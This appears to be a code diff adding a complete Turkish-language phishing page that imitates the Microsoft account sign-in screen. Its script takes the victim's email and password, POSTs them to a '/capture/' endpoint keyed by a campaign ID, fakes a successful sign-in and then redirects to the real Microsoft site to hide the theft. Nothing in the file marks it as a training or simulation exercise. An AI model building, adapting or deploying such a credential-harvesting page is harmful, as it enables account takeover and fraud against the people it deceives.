@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft hesabınızda oturum açın</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #323130;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            border: 1px solid #e6e6e6;
+            border-radius: 8px;
+            padding: 48px 40px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .microsoft-logo {
+            margin-bottom: 24px;
+        }
+
+        .microsoft-logo svg {
+            width: 108px;
+            height: 23px;
+            fill: #737373;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #000;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #616161;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+        }
+
+        .form-input.error {
+            border-color: #d13438;
+        }
+
+        .error-message {
+            color: #d13438;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .forgot-password {
+            display: block;
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: #0078d4;
+            font-size: 15px;
+            padding: 10px 0;
+            cursor: pointer;
+        }
+
+        .back-button:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            min-width: 108px;
+        }
+
+        .next-button:hover {
+            background-color: #106ebe;
+        }
+
+        .next-button:disabled {
+            background-color: #c7e0f4;
+            cursor: not-allowed;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e6e6e6;
+            color: #616161;
+            font-size: 15px;
+        }
+
+        .signup-link a {
+            color: #0078d4;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 48px;
+            text-align: center;
+            font-size: 12px;
+            color: #616161;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 16px;
+        }
+
+        .footer-links a {
+            color: #616161;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #0078d4;
+        }
+
+        .loading {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Password step */
+        .password-step {
+            display: none;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 12px;
+            background-color: #f3f2f1;
+            border-radius: 4px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #0078d4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            margin-right: 12px;
+            font-size: 18px;
+        }
+
+        .user-details {
+            flex: 1;
+        }
+
+        .user-email {
+            font-weight: 600;
+            color: #000;
+        }
+
+        .user-change {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .user-change:hover {
+            text-decoration: underline;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #616161;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .password-input-container {
+            position: relative;
+        }
+
+        .keep-signed-in {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .keep-signed-in input {
+            margin-right: 8px;
+            width: 20px;
+            height: 20px;
+        }
+
+        .keep-signed-in label {
+            font-size: 15px;
+            color: #323130;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="microsoft-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
+                <path fill="#f25022" d="M1 1h10v10H1z"></path>
+                <path fill="#00a4ef" d="M12 1h10v10H12z"></path>
+                <path fill="#7fba00" d="M1 12h10v10H1z"></path>
+                <path fill="#ffb900" d="M12 12h10v10H12z"></path>
+            </svg>
+        </div>
+
+        <h1 class="title">Oturum aç</h1>
+        <p class="subtitle">Microsoft hesabınızı kullanarak oturum açın</p>
+
+        <!-- Email Step -->
+        <div id="email-step">
+            <form id="email-form">
+                <div class="form-group">
+                    <input type="email" id="email" class="form-input" placeholder="E-posta, telefon veya Skype" autofocus required>
+                    <div class="error-message" id="email-error">Bu e-posta adresi veya telefon numarası tanınmıyor. Yeni bir Microsoft hesabı mı oluşturmak istiyorsunuz?</div>
+                </div>
+
+                <a href="#" class="forgot-password">E-posta adresimi unuttum</a>
+
+                <div class="signup-link">
+                    Microsoft hesabınız yok mu? <a href="#" onclick="createAccount()">Hemen oluşturun!</a>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="back-button" style="visibility: hidden;">Geri</button>
+                    <button type="submit" class="next-button" id="next-button">İleri</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Password Step -->
+        <div class="password-step" id="password-step">
+            <div class="user-info">
+                <div class="user-avatar" id="user-avatar">U</div>
+                <div class="user-details">
+                    <div class="user-email" id="user-email-display">user@example.com</div>
+                    <a href="#" class="user-change" onclick="goBackToEmail()">Hesap değiştir</a>
+                </div>
+            </div>
+
+            <form id="password-form">
+                <div class="form-group">
+                    <div class="password-input-container">
+                        <input type="password" id="password" class="form-input" placeholder="Parola" required>
+                        <button type="button" class="show-password" id="show-password-btn" onclick="togglePassword()">
+                            Göster
+                        </button>
+                    </div>
+                    <div class="error-message" id="password-error">Parolanız yanlış. Lütfen yeniden deneyin.</div>
+                </div>
+
+                <div class="keep-signed-in">
+                    <input type="checkbox" id="keepSignedIn" checked>
+                    <label for="keepSignedIn">Oturumu açık tut</label>
+                </div>
+
+                <a href="#" class="forgot-password">Parolanızı mı unuttunuz?</a>
+
+                <div class="button-group">
+                    <button type="button" class="back-button" onclick="goBackToEmail()">Geri</button>
+                    <button type="submit" class="next-button" id="password-next-button">Oturum aç</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="loading" id="loading"></div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Gizlilik ve tanımlama bilgileri</a>
+            <a href="#">Kullanım Şartları</a>
+        </div>
+        <div>© Microsoft 2023</div>
+    </div>
+
+    <script>
+        const campaignId = window.location.pathname.substring(1);
+        let userEmail = '';
+
+        // Email form submission
+        document.getElementById('email-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value.trim();
+
+            if (!validateEmail(email)) {
+                document.getElementById('email-error').style.display = 'block';
+                document.getElementById('email').classList.add('error');
+                return;
+            }
+
+            userEmail = email;
+            document.getElementById('user-email-display').textContent = email;
+            document.getElementById('user-avatar').textContent = email.charAt(0).toUpperCase();
+
+            // Switch to password step
+            document.getElementById('email-step').style.display = 'none';
+            document.getElementById('password-step').style.display = 'block';
+            document.getElementById('password').focus();
+        });
+
+        // Password form submission
+        document.getElementById('password-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const password = document.getElementById('password').value;
+            const keepSignedIn = document.getElementById('keepSignedIn').checked;
+
+            if (!password) {
+                document.getElementById('password-error').style.display = 'block';
+                document.getElementById('password').classList.add('error');
+                return;
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const response = await fetch(`/capture/${campaignId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        email: userEmail,
+                        password: password,
+                        keep_signed_in: keepSignedIn,
+                        timestamp: new Date().toISOString(),
+                        platform: 'Microsoft'
+                    })
+                });
+
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    alert('Oturum açma başarılı! Microsoft hesabınıza yönlendiriliyorsunuz...');
+
+                    setTimeout(() => {
+                        window.location.href = 'https://account.microsoft.com/';
+                    }, 1000);
+                }, 2000);
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('password-error').style.display = 'block';
+                document.getElementById('password').classList.add('error');
+            }
+        });
+
+        function goBackToEmail() {
+            document.getElementById('password-step').style.display = 'none';
+            document.getElementById('email-step').style.display = 'block';
+            document.getElementById('email').focus();
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const showBtn = document.getElementById('show-password-btn');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showBtn.textContent = 'Gizle';
+            } else {
+                passwordInput.type = 'password';
+                showBtn.textContent = 'Göster';
+            }
+        }
+
+        function createAccount() {
+            alert('Microsoft hesabı oluşturma özelliği şu anda kullanılamıyor.');
+        }
+
+        function validateEmail(email) {
+            // Accept email or phone
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[0-9]{10,15}$/;
+            const skypeRegex = /^[a-zA-Z0-9._-]+$/;
+
+            return emailRegex.test(email) || phoneRegex.test(email) || skypeRegex.test(email);
+        }
+
+        // Real-time validation
+        document.getElementById('email').addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('email-error').style.display = 'none';
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('password-error').style.display = 'none';
+        });
+    </script>
+</body>
+</html>
